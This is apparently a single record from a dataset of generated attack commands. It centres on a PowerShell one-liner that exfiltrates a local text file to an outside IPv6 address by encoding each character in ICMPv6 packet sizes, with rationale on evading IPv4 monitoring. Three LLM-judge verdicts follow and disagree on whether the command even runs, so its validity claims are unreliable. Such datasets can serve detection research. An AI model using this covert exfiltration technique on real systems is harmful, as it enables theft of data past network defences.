command: $d='fd00:0:be:ef::42'; $lines=Get-Content 'C:\Users\Public\message.txt'; foreach($line in $lines){ Test-Connection -ComputerName $d -Count 1 -BufferSize 900 -IPv6 -Quiet | Out-Null; $line.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (900 + [byte][char]$_) -IPv6 -Quiet | Out-Null } }
explanation: Frames text exfiltration over ICMPv6 by sending a start-of-line marker payload size followed by per-character payload sizes, using ICMPv6 as the alternate medium per T1011.
rationale_steps: Iterate lines, emitting a fixed-size sync marker for each line.
Encode each character into the ICMP payload size with a known base.
Use IPv6 addressing to avoid commonly monitored IPv4 channels.

llm_judgments.syntactic_justification: The PowerShell is well-formed with balanced quotes and separators, but Test-Connection mixes -ComputerName with -IPv6, a parameter combination unsupported in any PowerShell version, causing parameter-binding errors.
llm_judgments.semantic_justification: It conceptually automates exfiltration by encoding text into ICMPv6 payload sizes, but the invalid Test-Connection parameters prevent execution as written and the ULA IPv6 target may be unreachable, reducing operational feasibility.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with proper variable declarations, balanced parentheses/braces, correct method calls, and appropriate pipeline operators.
llm_judgments.semantic_justification: The command effectively implements automated exfiltration by reading a text file and encoding its contents in ICMPv6 packet buffer sizes, using Test-Connection to transmit data to an IPv6 address, which aligns perfectly with the T1011 technique of exfiltration over an alternative protocol.

llm_judgments.syntactic_justification: The command is perfectly well-formed with valid PowerShell syntax, balanced constructs, and correctly used parameters for cmdlets and methods.
llm_judgments.semantic_justification: The command precisely executes the claimed text exfiltration over ICMPv6 by encoding data into packet sizes, aligning perfectly with T1011's automated exfiltration via an alternative protocol.
